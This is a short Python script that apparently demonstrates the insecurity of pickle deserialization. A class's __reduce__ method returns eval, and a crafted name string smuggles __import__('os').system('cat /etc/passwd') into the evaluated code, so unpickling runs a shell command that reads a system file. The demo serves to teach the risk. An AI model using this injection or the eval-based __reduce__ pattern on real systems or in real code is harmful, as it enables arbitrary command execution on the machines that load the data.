# See https://docs.python.org/3/library/pickle.html
import pickle
from typing import Any

class ExampleClass:
    def __init__(self, name):
        self.name = name

    def __str__(self):
        return f"ExampleClass(name={self.name})"
    
    def __reduce__(self) -> str | tuple[Any, ...]:
        return eval, (f"print(f\"Hello {self.name}\")",)

# Serialize the object
serialized = pickle.dumps(ExampleClass("Alice"))

# Pickle payload
pickle_payload = b"\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c\x15print(f\"Hello Alice\")\x94\x85\x94R\x94."
# Deserialize the object
deserialized = pickle.loads(pickle_payload)
# All looks safe, right?
print(serialized)
print(deserialized)

# Now, let's try to exploit the pickle payload
# This can be done if the bytes to deserialize are tampered by the attacker
evil_example = ExampleClass("Alice\"),__import__('os').system('cat /etc/passwd'),print(\"")
serialized = pickle.dumps(evil_example)
print(pickle.loads(serialized))
